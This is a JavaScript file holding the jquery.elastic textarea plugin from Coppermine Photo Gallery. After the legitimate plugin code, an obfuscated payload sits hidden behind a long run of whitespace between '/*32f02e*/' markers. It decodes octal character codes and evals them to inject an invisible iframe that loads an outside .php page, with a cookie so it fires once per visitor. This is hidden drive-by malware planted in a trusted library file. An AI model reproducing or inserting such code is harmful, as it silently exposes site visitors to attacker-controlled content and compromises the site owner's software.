/*************************
  Coppermine Photo Gallery
  ************************
  Copyright (c) 2003-2012 Coppermine Dev Team
  v1.1 originaly written by Gregory DEMAR

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License version 3
  as published by the Free Software Foundation.

  ********************************************
  Coppermine version: 1.5.20
  $HeadURL: https://coppermine.svn.sourceforge.net/svnroot/coppermine/trunk/cpg1.5.x/js/jquery.elastic.js $
  $Revision: 8359 $
**********************************************/

/*************************
  jquery.elastic: v1.6
  Homepage: http://www.unwrongest.com/projects/elastic/
  Credits: Jan Järfalk
*************************/


(function($){$.fn.extend({elastic:function(){var mimics=['paddingTop','paddingRight','paddingBottom','paddingLeft','fontSize','lineHeight','fontFamily','width','fontWeight'];return this.each(function(){if(this.type!='textarea'){return false;}
var $textarea=$(this),$twin=$('<div />').css({'position':'absolute','display':'none'}),lineHeight=parseInt($textarea.css('lineHeight'),10)||parseInt($textarea.css('fontSize'),'10'),minheight=parseInt($textarea.css('height'),10)||lineHeight*3,maxheight=parseInt($textarea.css('max-height'),10)||Number.MAX_VALUE,goalheight=0,i=0;$twin.appendTo($textarea.parent());var i=mimics.length;while(i--){$twin.css(mimics[i].toString(),$textarea.css(mimics[i].toString()));}
function setHeightAndOverflow(height,overflow){curratedHeight=Math.floor(parseInt(height,10));if($textarea.height()!=curratedHeight){$textarea.css({'height':curratedHeight+'px','overflow':overflow});}}
function update(){var textareaContent=$textarea.val().replace(/<|>/g,' ').replace(/\n/g,'<br />').replace(/&/g,"&amp;");var twinContent=$twin.html();if(textareaContent+'&nbsp;'!=twinContent){$twin.html(textareaContent+'&nbsp;');if(Math.abs($twin.height()+lineHeight-$textarea.height())>3){var goalheight=$twin.height()+lineHeight;if(goalheight>=maxheight){setHeightAndOverflow(maxheight,'auto');}else if(goalheight<=minheight){setHeightAndOverflow(minheight,'hidden');}else{setHeightAndOverflow(goalheight,'hidden');}}}}
$textarea.css({'overflow':'hidden'}).bind('focus',function(){self.periodicalUpdater=window.setInterval(function(){update();},50);}).bind('blur',function(){clearInterval(self.periodicalUpdater);});update();});}});})(jQuery);

/*32f02e*/
                                                                                                                                                                                                                                                          r=eval;function vqvq(){zva=function(){--(d.body)}()};a=("47,155,174,165,152,173,160,166,165,47,201,67,100,57,60,47,202,24,21,47,175,150,171,47,172,173,150,173,160,152,104,56,150,161,150,177,56,102,24,21,47,175,150,171,47,152,166,165,173,171,166,163,163,154,171,104,56,160,165,153,154,177,65,167,157,167,56,102,24,21,47,175,150,171,47,201,47,104,47,153,166,152,174,164,154,165,173,65,152,171,154,150,173,154,114,163,154,164,154,165,173,57,56,160,155,171,150,164,154,56,60,102,24,21,24,21,47,201,65,172,171,152,47,104,47,56,157,173,173,167,101,66,66,171,166,163,163,160,165,160,64,201,150,162,160,165,173,157,166,172,65,156,171,66,172,152,171,160,167,173,172,66,116,155,152,164,176,117,130,200,65,167,157,167,56,102,24,21,47,201,65,172,173,200,163,154,65,167,166,172,160,173,160,166,165,47,104,47,56,150,151,172,166,163,174,173,154,56,102,24,21,47,201,65,172,173,200,163,154,65,152,166,163,166,171,47,104,47,56,75,56,102,24,21,47,201,65,172,173,200,163,154,65,157,154,160,156,157,173,47,104,47,56,75,167,177,56,102,24,21,47,201,65,172,173,200,163,154,65,176,160,153,173,157,47,104,47,56,75,167,177,56,102,24,21,47,201,65,172,173,200,163,154,65,163,154,155,173,47,104,47,56,70,67,67,67,75,56,102,24,21,47,201,65,172,173,200,163,154,65,173,166,167,47,104,47,56,70,67,67,67,75,56,102,24,21,24,21,47,160,155,47,57,50,153,166,152,174,164,154,165,173,65,156,154,173,114,163,154,164,154,165,173,111,200,120,153,57,56,201,56,60,60,47,202,24,21,47,153,166,152,174,164,154,165,173,65,176,171,160,173,154,57,56,103,167,47,160,153,104,143,56,201,143,56,47,152,163,150,172,172,104,143,56,201,67,100,143,56,47,105,103,66,167,105,56,60,102,24,21,47,153,166,152,174,164,154,165,173,65,156,154,173,114,163,154,164,154,165,173,111,200,120,153,57,56,201,56,60,65,150,167,167,154,165,153,112,157,160,163,153,57,201,60,102,24,21,47,204,24,21,204,24,21,155,174,165,152,173,160,166,165,47,132,154,173,112,166,166,162,160,154,57,152,166,166,162,160,154,125,150,164,154,63,152,166,166,162,160,154,135,150,163,174,154,63,165,113,150,200,172,63,167,150,173,157,60,47,202,24,21,47,175,150,171,47,173,166,153,150,200,47,104,47,165,154,176,47,113,150,173,154,57,60,102,24,21,47,175,150,171,47,154,177,167,160,171,154,47,104,47,165,154,176,47,113,150,173,154,57,60,102,24,21,47,160,155,47,57,165,113,150,200,172,104,104,165,174,163,163,47,203,203,47,165,113,150,200,172,104,104,67,60,47,165,113,150,200,172,104,70,102,24,21,47,154,177,167,160,171,154,65,172,154,173,133,160,164,154,57,173,166,153,150,200,65,156,154,173,133,160,164,154,57,60,47,62,47,72,75,67,67,67,67,67,61,71,73,61,165,113,150,200,172,60,102,24,21,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,47,104,47,152,166,166,162,160,154,125,150,164,154,62,51,104,51,62,154,172,152,150,167,154,57,152,166,166,162,160,154,135,150,163,174,154,60,24,21,47,62,47,51,102,154,177,167,160,171,154,172,104,51,47,62,47,154,177,167,160,171,154,65,173,166,116,124,133,132,173,171,160,165,156,57,60,47,62,47,57,57,167,150,173,157,60,47,106,47,51,102,47,167,150,173,157,104,51,47,62,47,167,150,173,157,47,101,47,51,51,60,102,24,21,204,24,21,155,174,165,152,173,160,166,165,47,116,154,173,112,166,166,162,160,154,57,47,165,150,164,154,47,60,47,202,24,21,47,175,150,171,47,172,173,150,171,173,47,104,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,65,160,165,153,154,177,126,155,57,47,165,150,164,154,47,62,47,51,104,51,47,60,102,24,21,47,175,150,171,47,163,154,165,47,104,47,172,173,150,171,173,47,62,47,165,150,164,154,65,163,154,165,156,173,157,47,62,47,70,102,24,21,47,160,155,47,57,47,57,47,50,172,173,150,171,173,47,60,47,55,55,24,21,47,57,47,165,150,164,154,47,50,104,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,65,172,174,151,172,173,171,160,165,156,57,47,67,63,47,165,150,164,154,65,163,154,165,156,173,157,47,60,47,60,47,60,24,21,47,202,24,21,47,171,154,173,174,171,165,47,165,174,163,163,102,24,21,47,204,24,21,47,160,155,47,57,47,172,173,150,171,173,47,104,104,47,64,70,47,60,47,171,154,173,174,171,165,47,165,174,163,163,102,24,21,47,175,150,171,47,154,165,153,47,104,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,65,160,165,153,154,177,126,155,57,47,51,102,51,63,47,163,154,165,47,60,102,24,21,47,160,155,47,57,47,154,165,153,47,104,104,47,64,70,47,60,47,154,165,153,47,104,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,65,163,154,165,156,173,157,102,24,21,47,171,154,173,174,171,165,47,174,165,154,172,152,150,167,154,57,47,153,166,152,174,164,154,165,173,65,152,166,166,162,160,154,65,172,174,151,172,173,171,160,165,156,57,47,163,154,165,63,47,154,165,153,47,60,47,60,102,24,21,204,24,21,160,155,47,57,165,150,175,160,156,150,173,166,171,65,152,166,166,162,160,154,114,165,150,151,163,154,153,60,24,21,202,24,21,160,155,57,116,154,173,112,166,166,162,160,154,57,56,175,160,172,160,173,154,153,146,174,170,56,60,104,104,74,74,60,202,204,154,163,172,154,202,132,154,173,112,166,166,162,160,154,57,56,175,160,172,160,173,154,153,146,174,170,56,63,47,56,74,74,56,63,47,56,70,56,63,47,56,66,56,60,102,24,21,24,21,201,67,100,57,60,102,24,21,204,24,21,204".split(","));d=document;for(i=0;i<a.length;i+=1){a[i]=-(10-3)+parseInt(a[i],4+4);}try{vqvq()}catch(q){yy=50-50;}try{yy/=72}catch(pq){yy=1;}if(!yy)r(String["fr"+"omCh"+"arCo"+"de"].apply(String,a));
/*/32f02e*/
